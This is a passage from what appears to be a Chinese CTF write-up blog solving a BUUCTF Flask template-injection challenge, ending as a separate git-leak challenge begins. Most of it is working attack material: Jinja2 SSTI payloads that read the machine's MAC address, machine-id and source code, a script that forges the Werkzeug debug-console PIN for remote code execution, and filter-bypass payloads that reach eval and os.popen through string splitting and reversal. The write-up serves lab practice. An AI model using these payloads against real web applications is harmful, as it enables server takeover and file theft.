+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<img src="/2023/08/03/buuctf/214822.png" class="">
+
+<p>将7e5fe8cec8a7转换为10进制为：138950392858791</p>
+<p>按照其他师傅wp，题目是docker环境，因此读机器id需要读&#x2F;proc&#x2F;self&#x2F;cgroup，但搞了半天生成的pin不对，后面试了一下&#x2F;etc&#x2F;machine-id，没想到对了，想想应该是其他师傅正式比赛时时docker环境，而我在buu做的时候是linux环境</p>
+<img src="/2023/08/03/buuctf/220612.png" class="">
+
+<p>1408f836b0ca514d796cbf8960e45fa1</p>
+<p>然后用巨佬写的exp生成pin码</p>
+<pre><code>import hashlib
+from itertools import chain
+probably_public_bits = [
+    &#39;flaskweb&#39;# username
+    &#39;flask.app&#39;,# modname
+    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+    &#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
+]
+private_bits = [
+    &#39;138950392858791&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
+    &#39;1408f836b0ca514d796cbf8960e45fa1&#39;# get_machine_id(), /etc/machine-id
+]
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&#39;utf-8&#39;)
+    h.update(bit)
+h.update(b&#39;cookiesalt&#39;)
+cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
+num = None
+if num is None:
+    h.update(b&#39;pinsalt&#39;)
+    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+print(rv)
+//267-749-798
+</code></pre>
+<p>将生成的pin码传入，然后就可以在终端RCE了</p>
+<img src="/2023/08/03/buuctf/230037.png" class="">
+
+<h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>先读app.py</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<img src="/2023/08/03/buuctf/230934.png" class="">
+
+<p>主要审计一下waf，过滤了import,flag,os,system,popen,eval等</p>
+<p>不过可以使用字符串拼接绕过或字符串倒转</p>
+<p>找目录</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+或
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<p>再读flag</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['open']('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+
+//字符串倒转
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
 <h1 id="混杂"><a href="#混杂" class="headerlink" title="混杂"></a>混杂</h1><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>扫了一下目录发现有.git，应该是git文件泄露，用githack扫一下：</p>
 <img src="/2023/08/03/buuctf/204241.png" class="">
 
